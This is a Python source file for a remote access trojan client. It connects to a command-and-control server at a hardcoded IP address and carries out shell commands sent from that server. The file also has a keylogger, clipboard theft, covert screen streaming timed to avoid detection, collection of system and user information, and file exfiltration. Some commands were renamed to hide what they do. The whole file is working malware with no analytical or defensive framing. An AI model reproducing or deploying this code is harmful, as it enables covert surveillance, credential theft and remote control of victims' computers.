import socket
import os
import subprocess
import pyautogui
import time
import platform
import getpass
import clipboard
from pynput import keyboard
import random

# Global variables
key_logs = []
key_logging = False

# Function for remote control
def execute_command(command):
    """Execute a shell command."""
    result = subprocess.getoutput(command)
    return result

# Stealthy Screen Capture
def stealthy_screenshare(client_socket):
    """Capture and send screen to the C2 server with randomized intervals."""
    try:
        while True:
            screenshot = pyautogui.screenshot()
            screenshot_bytes = screenshot.tobytes()
            client_socket.sendall(screenshot_bytes)
            time.sleep(random.uniform(0.1, 0.5))  # Randomize sleep time to avoid detection
    except Exception as e:
        print(f"[!] Error during screenshare: {e}")

def get_pc_info():
    """Retrieve system information."""
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Hostname": socket.gethostname()
    }
    return "\n".join(f"{key}: {value}" for key, value in info.items())

def get_user_info():
    """Retrieve current user and domain information."""
    user = getpass.getuser()
    domain = os.getenv("USERDOMAIN", "N/A")  # Domain might not always be available
    return f"User: {user}\nDomain: {domain}"

def get_clipboard_content():
    """Retrieve clipboard content."""
    try:
        content = clipboard.paste()
        return f"Clipboard Content: {content}"
    except Exception as e:
        return f"Error accessing clipboard: {e}"

def start_keylogger():
    """Start key logging with a temporary buffer."""
    global key_logging, key_logs
    key_logging = True
    key_logs = []

    def on_press(key):
        global key_logs, key_logging
        if not key_logging:
            return False  # Stop the listener
        try:
            if key == keyboard.Key.enter:
                key_logs.append("[ENTER]")
            elif hasattr(key, 'char') and key.char:  # Only capture printable characters
                key_logs.append(key.char)
        except AttributeError:
            pass

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    """Stop key logging."""
    global key_logging
    key_logging = False

def dump_keylogs():
    """Dump logged keys."""
    global key_logs
    return "".join(key_logs)

# Main client loop
def client_loop(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print(f"[*] Connected to C2 server at {server_ip}:{server_port}")

    while True:
        try:
            command = client.recv(4096).decode()
            if command.lower() == "exit":
                print("[*] Exiting...")
                client.close()
                break
            elif command.lower() == "viewstatus":  # Renamed from 'screenshare'
                stealthy_screenshare(client)
            elif command.lower().startswith("upload"):
                _, file_path, *dest = command.split()
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        client.send(f.read())
            elif command.lower().startswith("download"):
                _, file_path = command.split()
                with open(file_path, 'wb') as f:
                    f.write(client.recv(4096))
            elif command.lower() == "pcinfo":
                client.send(get_pc_info().encode())
            elif command.lower() == "identify":
                client.send(get_user_info().encode())
            elif command.lower() == "clipboard":
                client.send(get_clipboard_content().encode())
            elif command.lower() == "monitor set on":  # Renamed from 'keymon'
                start_keylogger()
                client.send(b"Keylogger started.")
            elif command.lower() == "monitor set off":
                stop_keylogger()
                client.send(b"Keylogger stopped.")
            elif command.lower() == "monitor dump":  # Renamed from 'keymon dump'
                client.send(dump_keylogs().encode())
            elif command.lower() == "help":
                help_text = """
Available Commands:
- upload <filename> -d <destination>: Upload a file to the client.
- download <filename>: Download a file from the client.
- pcinfo: Get system information.
- identify: Get current user and domain.
- clipboard: View clipboard content.
- monitor set on: Start keylogger monitoring.
- monitor set off: Stop keylogger monitoring.
- monitor dump: Dump key logs.
- help: Show this help text.
"""
                client.send(help_text.encode())
            else:
                result = execute_command(command)
                client.send(result.encode())
        except Exception as e:
            print(f"[!] Error: {e}")
            client.close()
            break

if __name__ == "__main__":
    SERVER_IP = "10.0.1.37"
    SERVER_PORT = 9999
    client_loop(SERVER_IP, SERVER_PORT)
